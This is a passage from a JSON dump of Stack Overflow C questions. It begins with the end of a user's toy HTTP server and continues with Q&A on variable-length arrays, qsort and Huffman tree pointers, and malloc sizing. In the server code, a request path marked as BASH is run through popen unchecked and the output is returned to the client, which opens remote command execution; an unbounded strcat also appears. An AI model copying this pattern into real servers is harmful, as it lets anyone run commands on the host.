*homeDir = NULL;\n    //get command line arguments -p port -d home dir\n    while ((arg = getopt(argc, argv, \"p:d:\")) != -1) {\n        switch (arg) {\n        case 'p':\n            port = atoi(optarg);\n            break;\n        case 'd':\n            homeDir = optarg;\n            break;\n        default:\n            fprintf(stderr, \"Please speicify -p port and -d home directiory\\n\");\n            exit(1);\n        }\n    }\n\n    if (port &lt; 1500 || homeDir == NULL) {\n        fprintf(stderr, \"BAD arguments use: -p port(greather then 1500) -d home dir\\n\");\n        exit(1);\n    }\n\n    //Create socket\n    socket_desc = socket(AF_INET, SOCK_STREAM, 0);\n    if (socket_desc == -1)\n    {\n        printf(\"Could not create socket\");\n        return 1;\n    }\n\n    //Prepare the sockaddr_in structure\n    server.sin_family = AF_INET;\n    server.sin_addr.s_addr = INADDR_ANY;\n    server.sin_port = htons(port);\n\n    //Bind\n    if (bind(socket_desc, (struct sockaddr *)&amp;server, sizeof(server)) &lt; 0)\n    {\n        fprintf(stderr, \"bind failed\\n\");\n        exit(1);\n    }\n\n    printf(\"bind done\\n\");\n\n    //Listen max 3\n    listen(socket_desc, 3);\n\n    //Accept and incoming connection\n    int loop = 1;\n\n    while (loop) {\n        printf(\"Waiting for incoming connections...\\n\");\n        c = sizeof(struct sockaddr_in);\n        loop = 0; //only for testing, if everything run ok loop will be infinity\n        client_socketfd = accept(socket_desc, (struct sockaddr *)&amp;client, (socklen_t*)&amp;c);\n        if (client_socketfd &lt; 0) {\n            fprintf(stderr, \"Accept failed\\n\");\n            exit(1);\n        }\n        //In child proc we are sending data\n        if (fork() == 0) {\n            close(socket_desc);//we dont need desc in child\n            bzero(sprava, 256);//all  on '\\0'\n\n        result = read(client_socketfd, sprava, 255);\n        printf(\"Server read: %s\\n\", sprava);\n\n        char* path;\n        int kod = parser(sprava, &amp;path);//in path is path to file\n        if (kod == ERROR_FILE_TYPE)\n        {\n                printf(\"BAD request!!!!\\n\");\n                shutdown(client_socketfd, SHUT_RDWR);\n                close(client_socketfd);\n            }\n            if (kod == HTML || kod == BASH || kod == JPG || kod == PNG)\n            {\n                if (kod == BASH)\n                {\n                    FILE *pipe;\n                    char *cmd = path;\n                    strcat(cmd, \" 2&gt;&amp;1\");//error output send to pipe\n                    printf(\"New command is=%s\\n\", cmd + 1);//we dont need first /\n                    //open pipe without first /\n                    pipe = popen(cmd + 1, \"r\");\n                    if (pipe != NULL) {\n                        char text[1035];\n                        while (fgets(text, sizeof(text) - 1, pipe) != NULL) {\n                            printf(\"output=%s\", path);\n                            write(client_socketfd, text, strlen(text));\n                        }\n                    }\n                    pclose(pipe);\n                }\n                else if (kod == HTML)\n                {\n                    int html;\n                    long len;\n                    char buff[1024] = { 0 };\n                    int ret;\n                    printf(\"Try to open file=%s\\n\", path + 1);\n                    html = open(path + 1, O_RDONLY);\n                    if (html == -1) {\n                        fprintf(stderr, \"Error opening file\\n\");\n                    }\n                    len = (long)lseek(html, (off_t)0, SEEK_END);//len of file\n                    lseek(html, (off_t)0, SEEK_SET);\n                    sprintf(buff, \"HTTP/1.1 200 OK\\nServer: nweb/%d.0\\nContent-Length: %ld\\nConnection: close\\nContent-Type: %s\\n\\n\", 20, len, \"text/html\");\n                    //send html header to client\n                    printf(\"Length of file=%d\\n\", len);\n                    write(client_socketfd, buff, strlen(buff));\n                    printf(\"Header was send\\n\");\n                    while ((ret = read(html, buff, 1023)) &gt; 0)\n                    {\n                        printf(\"number of bytes read=%d\\n\", ret);\n                        //write data to client,it will make connection reset\n                        write(client_socketfd, buff, ret);\n                    }\n                }\n                free(path);\n            }\n\n            shutdown(client_socketfd, SHUT_RDWR);\n            close(client_socketfd);\n            exit(0);\n\n        }\n        //in parent close client\n        else {\n            close(client_socketfd);\n            wait(&amp;wt);//this wait is only for testing\n        }\n    }\n    close(socket_desc);\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "size"], "comments": [{"owner": {"reputation": 2418, "user_id": 4205652, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh6.googleusercontent.com/-JU-6fQpM_Xs/AAAAAAAAAAI/AAAAAAAAAFA/BmnAnM8FkMM/photo.jpg?sz=128", "display_name": "Richard Erickson", "link": "https://stackoverflow.com/users/4205652/richard-erickson"}, "edited": false, "score": 0, "creation_date": 1449686721, "post_id": 34186266, "comment_id": 56119507, "body": "what error message are you getting? Please edit it into your question."}, {"owner": {"reputation": 29006, "user_id": 2851937, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/WSTnU.png?s=128&g=1", "display_name": "Jay", "link": "https://stackoverflow.com/users/2851937/jay"}, "edited": false, "score": 2, "creation_date": 1449687276, "post_id": 34186266, "comment_id": 56119862, "body": "It&#39;s not clear what you are trying to accomplish; do you want an array a that can hold 10 objects where indexes 0 and 1 have the values 1 and 2? Or are you wanting an array that has {1,2} at index 10? Or something else?"}, {"owner": {"reputation": 1, "user_id": 5660612, "user_type": "registered", "profile_image": "https://graph.facebook.com/10208094546342302/picture?type=large", "display_name": "Pankhuri Bedi", "link": "https://stackoverflow.com/users/5660612/pankhuri-bedi"}, "edited": false, "score": 0, "creation_date": 1449985095, "post_id": 34186266, "comment_id": 56238303, "body": "yes actually my problem is the value of x is returned by a function and i want to use that value as the size of my array. and i know i cant initialize the array size with a variable."}], "answers": [{"tags": [], "owner": {"reputation": 96743, "user_id": 2455888, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/MQu4W.png?s=128&g=1", "display_name": "haccks", "link": "https://stackoverflow.com/users/2455888/haccks"}, "is_accepted": false, "score": 0, "last_activity_date": 1449685513, "creation_date": 1449685513, "answer_id": 34186286, "question_id": 34186266, "link": "https://stackoverflow.com/questions/34186266/how-to-use-the-variable-x-to-initialize-an-array-i-know-we-cant-use-variable-he/34186286#34186286", "title": "how to use the variable x to initialize an array? i know we cant use variable here", "body": "<p>Variable length arrays are added in C99. Compile code in C99 mode. Use <code>-std=c99</code>. </p>\n\n<hr>\n\n<p><strong>Note:</strong> Looking at <code>conio.h</code>, I guess that you are using Turbo C++. Its an obsolete compiler. Update your self.</p>\n"}, {"tags": [], "owner": {"reputation": 133646, "user_id": 1119701, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d4bef9fe12d776629b204d4e650c2e0?s=128&d=identicon&r=PG", "display_name": "ouah", "link": "https://stackoverflow.com/users/1119701/ouah"}, "is_accepted": false, "score": 1, "last_activity_date": 1449685572, "creation_date": 1449685572, "answer_id": 34186309, "question_id": 34186266, "link": "https://stackoverflow.com/questions/34186266/how-to-use-the-variable-x-to-initialize-an-array-i-know-we-cant-use-variable-he/34186309#34186309", "title": "how to use the variable x to initialize an array? i know we cant use variable here", "body": "<p>In C89 you cannot specify the length of an array with a non-constant integer expression (variables do not qualify as constant expressions). You need to use a compiler version that supports C99  and variable-length arrays.</p>\n\n<p>in C89, what you can do is use a macro:</p>\n\n<pre><code>#define X 10\n</code></pre>\n\n<p>or use <code>malloc</code> to dynamically allocate your array:</p>\n\n<pre><code>int *a = malloc(x * sizeof *a);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "is_accepted": false, "score": 0, "last_activity_date": 1449688001, "creation_date": 1449688001, "answer_id": 34186986, "question_id": 34186266, "link": "https://stackoverflow.com/questions/34186266/how-to-use-the-variable-x-to-initialize-an-array-i-know-we-cant-use-variable-he/34186986#34186986", "title": "how to use the variable x to initialize an array? i know we cant use variable here", "body": "<blockquote>\n<pre><code>int x=10;\nint a[x]={1,2}; //how to use this x and not get an error\n</code></pre>\n</blockquote>\n\n<p>You can't.  </p>\n\n<p>You can do one of the following:</p>\n\n<ol>\n<li> Declare the array size using a <em>constant expression</em> whose value is known at compile time<sup>1</sup>:\n<pre><code>#define N 10\n...\nint a[N]={1,2};\n</code></pre>\nNote that this implicitly initializes <code>a[2]</code> through <code>a[9]</code> to 0.\n<hr>\n<li> Use a <em>variable-length array</em>, which is only available for C99 compilers and <em>optional</em> for C2011 compilers:\n\n<pre><code>int x = 10;\nint a[x];   // only valid if __STDC_VERSION__ >= 199901L and __STDC_NO_VLA__ is not defined\na[0] = 1;\na[1] = 2;\n...\n</code></pre>\nYou cannot use an array initializer like <code>{1,2}</code> for variable-length arrays; you either have to initialize the elements individually, as above, or you could attempt to use <code>memcpy</code> with a <em>compound literal</em>:\n<pre><code>memcpy( a, (int[]){1, 2}, sizeof (int[]){1, 2} );\n</code></pre>\n\nUnlike method 1, this will <em>not</em> implicitly initialize <code>a[2]</code> through <code>a[9]</code> to 0; those elements will be <em>indeterminate</em>.\n<hr>\n<li> If VLAs are not available (you're using a C89 or earlier compiler, or a C2011 compiler that defines the macro <code>__STDC_NO_VLA__</code>), then dynamically allocate space for an array and initialize as you would for a VLA:<br>\n<pre><code>int x = 10;\nint *a = malloc( sizeof *a * x );\nif ( a )\n{\n  a[0] = 1;\n  a[1] = 2; // or memcpy( a, (int[]){1,2}, sizeof (int[]){1,2} );\n}</code></pre>\n\nLike the VLA method above, this does <em>not</em> initialize elements <code>a[2]</code> through <code>a[9]</code> to 0.  \n<br>\nRemember to <code>free</code> the memory when you're done with it:<br>\n<pre><code>free( a );</code></pre>\n</ol>\n\n<p><hr>\n<sup>1. Meaning a literal like <code>10</code>, an expression made up of literals like <code>5+5</code>, or a macro that expands to one of the previous.\n</sup></p>\n"}], "owner": {"reputation": 1, "user_id": 5660612, "user_type": "registered", "profile_image": "https://graph.facebook.com/10208094546342302/picture?type=large", "display_name": "Pankhuri Bedi", "link": "https://stackoverflow.com/users/5660612/pankhuri-bedi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 79, "favorite_count": 0, "answer_count": 3, "score": -1, "last_activity_date": 1449985146, "creation_date": 1449685454, "last_edit_date": 1449985146, "question_id": 34186266, "link": "https://stackoverflow.com/questions/34186266/how-to-use-the-variable-x-to-initialize-an-array-i-know-we-cant-use-variable-he", "title": "how to use the variable x to initialize an array? i know we cant use variable here", "body": "<pre><code>#include&lt;conio.h&gt; \n#include&lt;stdio.h&gt;\nint main()\n{   \n    int x=10;\n    int a[x]={1,2}; //how to use this x and not get an error\n    getch();\n}\n</code></pre>\n\n<p>How to use this x and not get an error? Initialization needs a constant number so how can this be done?\nMy problem is the value of x is returned by a function and i want to use that value as the size of my array. and i know i cant initialize the array size with a variable</p>\n"}, {"tags": ["c", "tree", "binary-tree", "huffman-code", "qsort"], "answers": [{"comments": [{"owner": {"reputation": 115, "user_id": 5430956, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b317c8e3cc4277f7913d6231877f5eb4?s=128&d=identicon&r=PG&f=1", "display_name": "oodles2do", "link": "https://stackoverflow.com/users/5430956/oodles2do"}, "edited": false, "score": 0, "creation_date": 1449685744, "post_id": 34186310, "comment_id": 56118916, "body": "Thanks for the answer! That makes a lot of sense, when I create a node with 2 leaves, I&#39;m supposed to delete those leaves from the list, so that they&#39;re not used again. I do this by setting their frequency to 0 and then only consider the ones that have freq &gt; 0. This seems like a bad way to do it."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 1, "creation_date": 1449685975, "post_id": 34186310, "comment_id": 56119075, "body": "Alternatively, instead of sorting the Node array, one could create an array of pointers to the <code>Node</code>s and sort <i>that</i>."}, {"owner": {"reputation": 115, "user_id": 5430956, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b317c8e3cc4277f7913d6231877f5eb4?s=128&d=identicon&r=PG&f=1", "display_name": "oodles2do", "link": "https://stackoverflow.com/users/5430956/oodles2do"}, "edited": false, "score": 0, "creation_date": 1449686116, "post_id": 34186310, "comment_id": 56119160, "body": "Thanks John, I was just thinking the same thing, create 2 arrays and keep one static :)."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1449686286, "post_id": 34186310, "comment_id": 56119256, "body": "The other alternative is not to sort at all. The algorithm requires that you find the two lowest frequencies at each step. This can be done with a single pass through the array, keeping track of the two lowest frequencies seen. That&#39;s actually faster than sorting the array."}, {"owner": {"reputation": 115, "user_id": 5430956, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b317c8e3cc4277f7913d6231877f5eb4?s=128&d=identicon&r=PG&f=1", "display_name": "oodles2do", "link": "https://stackoverflow.com/users/5430956/oodles2do"}, "edited": false, "score": 0, "creation_date": 1449686474, "post_id": 34186310, "comment_id": 56119360, "body": "I see what you mean, but I have to insert the newly created node into the correct place of the list. I&#39;ve been told to use an insertion sort, but I haven&#39;t ever used it before."}, {"owner": {"reputation": 115, "user_id": 5430956, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b317c8e3cc4277f7913d6231877f5eb4?s=128&d=identicon&r=PG&f=1", "display_name": "oodles2do", "link": "https://stackoverflow.com/users/5430956/oodles2do"}, "edited": false, "score": 0, "creation_date": 1449686597, "post_id": 34186310, "comment_id": 56119429, "body": "That is probably how I can do it actually, with the least changes. Rather than resorting the list each time I just put the new node in the correct place. I think that&#39;ll work with the indexing"}], "tags": [], "owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "is_accepted": true, "score": 1, "last_activity_date": 1449685573, "creation_date": 1449685573, "answer_id": 34186310, "question_id": 34186096, "link": "https://stackoverflow.com/questions/34186096/qsort-with-huffman-tree/34186310#34186310", "title": "Qsort with Huffman tree", "body": "<p><code>qsort</code> moves the structures around in the array. So if there exists a <code>left</code> pointer that points to character <code>X</code> at index 3 in the array, and <code>qsort</code> moves <code>X</code> to index 16, then the <code>left</code> pointer won't be pointing at <code>X</code> anymore. It will be pointing to whatever <code>qsort</code> put at index 3. Long story short, you need to recompute all of the <code>left</code> and <code>right</code> pointers after every sort. </p>\n"}], "owner": {"reputation": 115, "user_id": 5430956, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b317c8e3cc4277f7913d6231877f5eb4?s=128&d=identicon&r=PG&f=1", "display_name": "oodles2do", "link": "https://stackoverflow.com/users/5430956/oodles2do"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 145, "favorite_count": 0, "accepted_answer_id": 34186310, "answer_count": 1, "score": 1, "last_activity_date": 1517992590, "creation_date": 1449684950, "last_edit_date": 1517992590, "question_id": 34186096, "link": "https://stackoverflow.com/questions/34186096/qsort-with-huffman-tree", "title": "Qsort with Huffman tree", "body": "<p>I have a problem where I have to build a Huffman tree, I understand the concept behind the problem and I know how to do it. However, I have discovered the reason for my code going wrong is to do with my sorting functions. I want to sort the list every time I input a new node into the list. I have a structure and in it I have frequency, I have made an array of structures that character are store in from a file.</p>\n\n<p>My problem lies with creating the nodes, a new node is created and points to two characters in the array. However, when I then sort this list the pointers change to other characters. This happens for every step and causes it to be completely wrong.</p>\n\n<p>My qsort call in main is like this:</p>\n\n<pre><code>qsort(list, n, sizeof(Node), intcompare);\n</code></pre>\n\n<p>and my intcompare function is like this:</p>\n\n<pre><code>int intcompare(const void *a, const void *b)\n{\nint freq1 = ((Node*)a)-&gt;frequency;\nint freq2 = ((Node*)b)-&gt;frequency;\n\n   if (freq1 == freq2){\n      return 0;\n   }\n   else if (freq1 &lt; freq2){\n      return 1;\n   }\n   else{\n      return -1;\n   }\n\n}\n</code></pre>\n\n<p>my structure is like this:</p>\n\n<pre><code>typedef struct node{\n   char character;\n   int frequency;\n   struct node *left;\n   struct node *right;\n}Node;\n</code></pre>\n\n<p>My list gets sorted correctly by frequency each time I call qsort.\nWhy would this change where the pointers in my struct are pointing to?\nThanks in advance!!</p>\n"}, {"tags": ["c", "string"], "comments": [{"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 2, "creation_date": 1449684779, "post_id": 34185997, "comment_id": 56118298, "body": "What type is &#39;copy_p&#39; and what it it&#39;s size?"}, {"owner": {"reputation": 14429, "user_id": 3494013, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ff6b6de2f59471e271413f74921e054a?s=128&d=identicon&r=PG&f=1", "display_name": "cadaniluk", "link": "https://stackoverflow.com/users/3494013/cadaniluk"}, "edited": false, "score": 1, "creation_date": 1449684838, "post_id": 34185997, "comment_id": 56118339, "body": "If <code>copy_p</code> is a pointer, retrieve the string length with <code>strlen</code>."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1449684880, "post_id": 34185997, "comment_id": 56118371, "body": "I suggest you use a temporary: &#39;int tempSize=(sizeof(copy_p)+1;&#39;, then break on the line after and inspect tempSize."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1449685035, "post_id": 34185997, "comment_id": 56118478, "body": "In fact, I strongly suggest that you use temp locals every time you need to calculate some value for a library call argument."}, {"owner": {"reputation": 25589, "user_id": 15727, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/FFivc.jpg?s=128&g=1", "display_name": "Thomas Padron-McCarthy", "link": "https://stackoverflow.com/users/15727/thomas-padron-mccarthy"}, "edited": false, "score": 0, "creation_date": 1449685530, "post_id": 34185997, "comment_id": 56118785, "body": "Based on how you have placed the spaces, I don&#39;t think <code>strlen(copy_p)+1 * sizeof(char)</code> does what you think it does. (Not that it matters in this case, though, since <code>sizeof(char)</code> is, by definition, 1.)"}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1449702675, "post_id": 34185997, "comment_id": 56127936, "body": "There&#39;s no errors in the code you have posted. The problem must be elsewhere. Please post a <a href=\"http://stackoverflow.com/help/mcve\">MCVE</a>"}], "answers": [{"comments": [{"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1449685105, "post_id": 34186115, "comment_id": 56118523, "body": "Yes - I was trying to drop hints:)"}, {"owner": {"reputation": 229, "user_id": 3706129, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/2e17cff6efe2f0faf62cab3d57977d58?s=128&d=identicon&r=PG&f=1", "display_name": "user3706129", "link": "https://stackoverflow.com/users/3706129/user3706129"}, "edited": false, "score": 0, "creation_date": 1449685130, "post_id": 34186115, "comment_id": 56118536, "body": "tried with strlen and it did the same thing , this does not happen for all strings tho , most of them are fine after printing..."}, {"owner": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "reply_to_user": {"reputation": 229, "user_id": 3706129, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/2e17cff6efe2f0faf62cab3d57977d58?s=128&d=identicon&r=PG&f=1", "display_name": "user3706129", "link": "https://stackoverflow.com/users/3706129/user3706129"}, "edited": false, "score": 0, "creation_date": 1449685486, "post_id": 34186115, "comment_id": 56118754, "body": "@user3706129 It looks like something else in your code is inserting a null terminator into your string some four characters before the end. The original code (with <code>sizeof</code> instead of <code>strlen</code>) this could have happened because an adjacent block got allocated to some other string or structure. With the <code>strlen</code> this could happen because of a memory error somewhere else. Try running the program through valgrind or some other memory profile to see what is going on."}], "tags": [], "owner": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "is_accepted": true, "score": 6, "last_activity_date": 1449685118, "last_edit_date": 1449685118, "creation_date": 1449685005, "answer_id": 34186115, "question_id": 34185997, "link": "https://stackoverflow.com/questions/34185997/wrong-copying-into-struct/34186115#34186115", "title": "wrong copying into struct", "body": "<p>This line is incorrect regardless of the type of <code>copy_p</code>:</p>\n\n<pre><code>str[i].string=(char*)malloc(sizeof(copy_p)+1 * sizeof(char));\n</code></pre>\n\n<ul>\n<li><p>If <code>copy_p</code> is an array of characters initialized with a string literal, i.e.</p>\n\n<pre><code>char copy_p[] = \"Program has stopped working\";\n</code></pre>\n\n<p>then <code>+1</code> is unnecessary, because array size already includes null terminator.</p></li>\n<li><p>If <code>copy_p</code> is a pointer <code>char *copy_p</code>, then you need to call <code>strlen</code> instead of <code>sizeof</code>, i.e.</p>\n\n<pre><code>str[i].string=malloc(strlen(copy_p)+1 * sizeof(char));\n</code></pre></li>\n</ul>\n\n<p><strong>Note:</strong> casting results of <code>malloc</code> is unnecessary in C.</p>\n"}], "owner": {"reputation": 229, "user_id": 3706129, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/2e17cff6efe2f0faf62cab3d57977d58?s=128&d=identicon&r=PG&f=1", "display_name": "user3706129", "link": "https://stackoverflow.com/users/3706129/user3706129"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 50, "favorite_count": 1, "accepted_answer_id": 34186115, "answer_count": 1, "score": 1, "last_activity_date": 1449701789, "creation_date": 1449684670, "last_edit_date": 1449685067, "question_id": 34185997, "link": "https://stackoverflow.com/questions/34185997/wrong-copying-into-struct", "title": "wrong copying into struct", "body": "<p>I am passing string into struct , i am doin it like this inside for loop </p>\n\n<pre><code>printf(\"copy = %s\\n\",copy_p);\nstr[i].string=(char*)malloc(strlen(copy_p)+1 * sizeof(char));\nstrcpy(str[i].string,copy_p);\nprintf(\"skop = %s\\n\" , str[i].string);\n</code></pre>\n\n<p>So if <code>copy_p</code> variable is \"Program has stopped working\" this is what happens</p>\n\n<pre><code>printf(\"copy = %s\\n\",copy_p); // copy = Program has stopped working\nprintf(\"skop = %s\\n\" , str[i].string); // skop = Program has stopped working\n</code></pre>\n\n<p>But if i call this <code>printf(\"%s\\n\",str[0].string)</code> it outputs <code>Program has stopped work!</code>  why is that? but it isnt like this all the time it works for the most of the inputs</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 74843, "user_id": 2988730, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/ZOX7t.jpg?s=128&g=1", "display_name": "Mad Physicist", "link": "https://stackoverflow.com/users/2988730/mad-physicist"}, "edited": false, "score": 0, "creation_date": 1449684293, "post_id": 34185799, "comment_id": 56117994, "body": "You could just declare/allocate a char array and cast that pointer to <code>strbuf_t *</code>. <code>len</code> would then be <code>sizeof(char_array) - sizeof(strbuf_t) - 1</code>."}, {"owner": {"reputation": 74843, "user_id": 2988730, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/ZOX7t.jpg?s=128&g=1", "display_name": "Mad Physicist", "link": "https://stackoverflow.com/users/2988730/mad-physicist"}, "edited": false, "score": 0, "creation_date": 1449684482, "post_id": 34185799, "comment_id": 56118112, "body": "Your way is better since it will have better alignment."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 3, "creation_date": 1449684614, "post_id": 34185799, "comment_id": 56118189, "body": "Zero-sized arrays are not standard. Use a VLA."}, {"owner": {"reputation": 74843, "user_id": 2988730, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/ZOX7t.jpg?s=128&g=1", "display_name": "Mad Physicist", "link": "https://stackoverflow.com/users/2988730/mad-physicist"}, "edited": false, "score": 0, "creation_date": 1449684758, "post_id": 34185799, "comment_id": 56118281, "body": "Good point, make it <code>char str[1];</code> and count that as your <code>\\0</code>. Actually makes book-keeping easier."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1449684764, "post_id": 34185799, "comment_id": 56118287, "body": "Why do you make <code>a</code> is a pointer anyway? Why not just use that <code>struct</code>? Have you tried to compile? What is <code>zero</code> for? Seems to be useless."}, {"owner": {"reputation": 814, "user_id": 5608223, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/040d9c81fc7a722b9f93cc492ab3a728?s=128&d=identicon&r=PG&f=1", "display_name": "N. Leavy", "link": "https://stackoverflow.com/users/5608223/n-leavy"}, "edited": false, "score": 0, "creation_date": 1449685001, "post_id": 34185799, "comment_id": 56118452, "body": "I have compiled this, and it works. The <code>zero</code> is to 0 terminate the string if someone uses <code>strncpy</code> incorrectly (as I did in the example). Regarding the VLAs - those aren&#39;t fully standard in C11 either. Probably best to use a length of 1, then offset the length by 1"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1449685090, "post_id": 34185799, "comment_id": 56118511, "body": "@N.Leavy: <code>zero</code> will not work. If you really forget to terminate your array, you invoke undefined behaviour if you access the array beyond its boundaries. There is no guarantee there will be no padding or nasal demons past the array..And VLAs are very well standard, even in C11! They are just optional (and yes, imo it was a stupid decission). Just use <code>_Static_assert(!__STDC_NO_VLA__)</code>. However, you propose a defintively non-standard extension over an optinal (and likely implemented one)?"}, {"owner": {"reputation": 814, "user_id": 5608223, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/040d9c81fc7a722b9f93cc492ab3a728?s=128&d=identicon&r=PG&f=1", "display_name": "N. Leavy", "link": "https://stackoverflow.com/users/5608223/n-leavy"}, "edited": false, "score": 0, "creation_date": 1449685305, "post_id": 34185799, "comment_id": 56118643, "body": "<code>zero</code> does in fact work - as is shown in the example where the 10 byte string is not null terminated because strncpy doesn&#39;t always null terminate a string. It is technically undefined behaviour in that the layout of a struct is not defined, so the compiler may feel free to pad space between <code>space</code> and <code>zero</code>. But seeing a few bytes of junk at the end of a string is much better than blowing your stack."}, {"owner": {"reputation": 814, "user_id": 5608223, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/040d9c81fc7a722b9f93cc492ab3a728?s=128&d=identicon&r=PG&f=1", "display_name": "N. Leavy", "link": "https://stackoverflow.com/users/5608223/n-leavy"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1449685444, "post_id": 34185799, "comment_id": 56118730, "body": "@olaf: regarding the VLAs - I would need to define a different strbuf_t everywhere I wanted to declare one with a different size, then cast it back to a standard strbuf_t. Certainly that would be a solution to the problem, but it doesn&#39;t seem more elegant than what I have now. In any event, I removed the zero length array."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1449685469, "post_id": 34185799, "comment_id": 56118741, "body": "Meditate about the implications of <b>undefined</b> behaviour. Yes, that does include it might even behave as expected. But you were asking for a <b>standard</b> way, and invoking UB is exactly the opposite. Just make your functions work properly and unit-test. Btw: why do you think <code>zero</code> will be properly initialised and not overwritten if you don&#39;t trust your functions to terminate the array properly? You could as well just set the last entry to <code>&#39;\\0&#39;</code>. That would serve exactly the same purpose, but without UB."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, 